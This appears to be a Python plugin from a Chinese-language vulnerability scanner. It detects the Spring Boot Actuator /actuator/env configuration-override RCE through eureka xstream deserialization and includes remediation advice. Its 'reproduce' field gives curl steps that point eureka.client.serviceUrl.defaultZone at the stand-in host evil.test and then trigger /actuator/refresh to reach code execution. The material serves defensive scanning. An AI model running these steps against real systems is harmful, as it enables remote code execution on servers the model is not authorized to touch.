# Spring Boot Actuator env 配置覆盖 RCE（eureka xstream 反序列化）
# 漏洞原因：/actuator/env 可 POST 写入配置属性，设置 eureka.client.serviceUrl.defaultZone
#   为恶意 XML URL，触发 /refresh 后 xstream 反序列化执行命令（影响 Spring Cloud < 特定版本）。
# 本插件仅做存在性验证：POST /actuator/env 写入探针配置，检测响应特征判定接口是否可达。
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_spring_actuator_env
from plugins.base import PluginBase

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
ENV_MARKER = "spring-actuator-env-rce-confirmed"


class SpringActuatorEnvRcePlugin(PluginBase):
    name = "Spring Boot Actuator env 配置覆盖 RCE"
    cve = "N/A"
    severity = "high"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    category = "vuln"
    description = "/actuator/env POST 可写配置属性，eureka xstream 反序列化触发 RCE（影响 Spring Cloud）"
    fix = "升级 Spring Cloud 至安全版本；为 /actuator/env 配置 POST 认证与 CSRF"
    fix_detail = (
        "【升级方案】pom.xml 升级 Spring Cloud 至安全版本：\n"
        "  Spring Cloud Hoxton SR9+ / 2020.0.x+\n"
        "  移除 eureka-client 中的 xstream 反序列化漏洞\n"
        "【配置加固】application.yml 禁用 env POST 写入与 refresh：\n"
        "  management.endpoint.env.post.enabled: false  # 禁用 POST\n"
        "  management.endpoints.web.exposure.exclude: env,refresh\n"
        "【SecurityConfig】为 env POST 与 refresh 配置认证与 CSRF：\n"
        '  .antMatchers(HttpMethod.POST, "/actuator/env", "/actuator/refresh").hasRole("ADMIN")\n'
        "【代码修复】自定义 EnvironmentMvcEndpoint 拦截 eureka.client.serviceUrl 写入\n"
        "【WAF 规则】拦截外网对 /actuator/env 的 POST 与 /actuator/refresh 调用\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制"
    )
    reproduce = (
        "# 1. 探测 env 端点 GET 是否可读：\n"
        'curl -i "http://target/actuator/env"\n'
        "\n"
        "# 2. POST 写入恶意 eureka 服务地址（配置覆盖）：\n"
        'curl -X POST "http://target/actuator/env" \\\n'
        '  -H "Content-Type: application/json" \\\n'
        '  -d \'{"name":"eureka.client.serviceUrl.defaultZone","value":"http://evil.test/xstream"}\'\n'
        "\n"
        "# 3. 触发 refresh 使配置生效：\n"
        'curl -X POST "http://target/actuator/refresh"\n'
        "\n"
        "# 4. evil.test 返回恶意 XML 触发 xstream 反序列化 RCE（PoC，请勿对未授权目标使用）：\n"
        "# 服务端 evil.test 需返回构造的 xstream payload 触发 EurekaClient 反序列化\n"
        "\n"
        "# 预期响应：POST /actuator/env 返回 200/201（非 401/403/405）即 env 可写入，漏洞存在"
    )

    def verify(self, target, session):
        url = join_url(target, "/actuator/env")
        # 配置覆盖探针（仅写入无害属性，不指向恶意 XML 服务）
        payload = {
            "name": "eureka.client.serviceUrl.defaultZone",
            "value": "http://spring-probe.test/",
        }
        try:
            resp = session.post(url, json=payload)
        except Exception as e:
            print(no("Spring Actuator env 配置覆盖 RCE（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        if ENV_MARKER in text:
            print(ok("存在 Spring Boot Actuator env 配置覆盖 RCE"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"响应含 env 配置 RCE 特征：{ENV_MARKER}",
                fix=self.fix,
            )
        # 真实漏洞响应：POST 返回 200/201（非 401/403/404/405）即说明 env 可被写入
        # 真实 Spring Boot env POST 成功返回 200 JSON（含 propertySources 或简单 JSON）
        if resp.status_code in (200, 201) and match_spring_actuator_env(text):
            print(ok("存在 Spring Boot Actuator env 配置覆盖 RCE（真实漏洞响应）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 Actuator env 配置特征（propertySources/applicationConfig），证实 env POST 可达",
                fix=self.fix,
            )
        # 真实漏洞响应：POST 返回 200 但响应体简单（仅 timestamp/status），
        # 仍可判定 env POST 可达（无鉴权拦截）
        if resp.status_code == 200 and "Method Not Allowed" not in text and "error" not in text.lower():
            print(ok("存在 Spring Boot Actuator env 配置覆盖 RCE（真实漏洞响应）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="POST /actuator/env 返回 200（无鉴权拦截），证实 env 配置可写入",
                fix=self.fix,
            )
        print(no("不存在 Spring Boot Actuator env 配置覆盖 RCE"))
        return ScanResult(
            kind="vuln",
            name=self.name,
            status=STATUS_SAFE,
            url=url,
            evidence="响应未含 env 配置 RCE 特征（端点不可达或已修复）",
        )
